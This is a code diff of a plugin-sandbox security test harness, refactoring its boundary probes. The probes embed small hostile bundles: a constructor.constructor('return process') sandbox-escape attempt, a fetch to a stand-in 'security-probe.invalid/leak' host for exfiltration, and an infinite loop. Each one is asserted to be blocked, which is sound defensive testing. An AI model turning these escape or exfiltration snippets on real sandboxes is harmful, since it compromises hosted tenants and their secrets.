@@ -5,7 +5,7 @@ import { lstatSync, readFileSync } from "node:fs";
 import { isAbsolute, resolve } from "node:path";
 import { isDeepStrictEqual } from "node:util";
 
-import { runScopedPluginDispatch } from "../packages/loader/dist/index.js";
+import { runScopedHandler, runScopedPluginDispatch } from "../packages/loader/dist/index.js";
 import { runAfterPluginAuthoringBoundaryProbes } from "./plugin-authoring-security-boundary.mjs";
 
 const MAX_INPUT_BYTES = 256 * 1024;
@@ -26,10 +26,16 @@ try {
   assertExactKeys(envelope, [
     "schemaVersion",
     "authenticationKey",
+    "hookType",
     "securityCase",
     "allowedCapabilities"
   ]);
   assert(envelope.schemaVersion === 1);
+  assert(
+    envelope.hookType === "event" ||
+      envelope.hookType === "transform" ||
+      envelope.hookType === "policy"
+  );
   const authenticationKey = Buffer.from(envelope.authenticationKey, "base64url");
   assert(
     authenticationKey.length === 32 &&
@@ -50,6 +56,7 @@ try {
       const runtimeResult = await runScopedPluginDispatch({
         bundleCode: readFileSync(bundlePath, "utf8"),
         hookName: envelope.securityCase.hookName,
+        hookType: envelope.hookType,
         payload: envelope.securityCase.payload,
         context: {
           capability: async (name, capabilityInput) => {
@@ -103,9 +110,9 @@ try {
 
 async function runBoundaryProbes() {
   try {
-    const isolation = await runScopedPluginDispatch({
-      bundleCode: `exports.plugin={dispatch:()=>{const recover=(value)=>{try{return Boolean(value.constructor.constructor("return process")())}catch{return false}};return {ok:true,value:{processVisible:typeof process!=="undefined",requireVisible:typeof require!=="undefined",secretVisible:typeof TENANTSCRIPT_SECURITY_CANARY!=="undefined",urlRecovery:recover(URL),fetchRecovery:recover(fetch),moduleRecovery:recover(module)}}}};`,
-      hookName: "security.probe",
+    const isolation = await runScopedHandler({
+      bundleCode: `exports.handlers={"security.probe":()=>{const recover=(value)=>{try{return Boolean(value.constructor.constructor("return process")())}catch{return false}};return {processVisible:typeof process!=="undefined",requireVisible:typeof require!=="undefined",secretVisible:typeof TENANTSCRIPT_SECURITY_CANARY!=="undefined",urlRecovery:recover(URL),fetchRecovery:recover(fetch),moduleRecovery:recover(module)}}};`,
+      handlerName: "security.probe",
       payload: {},
       context: { capability: async () => null },
       limits: { timeoutMs: 100, maxSubrequests: 0, memoryMb: 128 }
@@ -113,39 +120,36 @@ async function runBoundaryProbes() {
     assert(
       isDeepStrictEqual(isolation, {
         value: {
-          ok: true,
-          value: {
-            processVisible: false,
-            requireVisible: false,
-            secretVisible: false,
-            urlRecovery: false,
-            fetchRecovery: false,
-            moduleRecovery: false
-          }
+          processVisible: false,
+          requireVisible: false,
+          secretVisible: false,
+          urlRecovery: false,
+          fetchRecovery: false,
+          moduleRecovery: false
         },
         logs: []
       })
     );
 
-    const egress = await runScopedPluginDispatch({
-      bundleCode: `exports.plugin={dispatch:async()=>{try{await fetch("https://security-probe.invalid/leak")}catch{}return {ok:true,value:"blocked"}}};`,
-      hookName: "security.probe",
+    const egress = await runScopedHandler({
+      bundleCode: `exports.handlers={"security.probe":async()=>{try{await fetch("https://security-probe.invalid/leak")}catch{}return "blocked"}};`,
+      handlerName: "security.probe",
       payload: {},
       context: { capability: async () => null },
       limits: { timeoutMs: 100, maxSubrequests: 1, memoryMb: 128 }
     });
     assert(
       isDeepStrictEqual(egress, {
-        value: { ok: true, value: "blocked" },
+        value: "blocked",
         logs: [{ reason: "egress_denied", target: "https://security-probe.invalid/leak" }]
       })
     );
 
     let budgetExceeded = false;
     try {
-      await runScopedPluginDispatch({
-        bundleCode: `exports.plugin={dispatch:async({context})=>{await context.capability("probe.allowed",{});await context.capability("probe.allowed",{});return {ok:true}}};`,
-        hookName: "security.probe",
+      await runScopedHandler({
+        bundleCode: `exports.handlers={"security.probe":async(_payload,context)=>{await context.capability("probe.allowed",{});await context.capability("probe.allowed",{});return {ok:true}}};`,
+        handlerName: "security.probe",
         payload: {},
         context: { capability: async () => ({ ok: true }) },
         limits: { timeoutMs: 100, maxSubrequests: 1, memoryMb: 128 }
@@ -159,9 +163,9 @@ async function runBoundaryProbes() {
 
     let timedOut = false;
     try {
-      await runScopedPluginDispatch({
-        bundleCode: `exports.plugin={dispatch:()=>{while(true){}}};`,
-        hookName: "security.probe",
+      await runScopedHandler({
+        bundleCode: `exports.handlers={"security.probe":()=>{while(true){}}};`,
+        handlerName: "security.probe",
         payload: {},
         context: { capability: async () => null },
         limits: { timeoutMs: 25, maxSubrequests: 0, memoryMb: 128 }
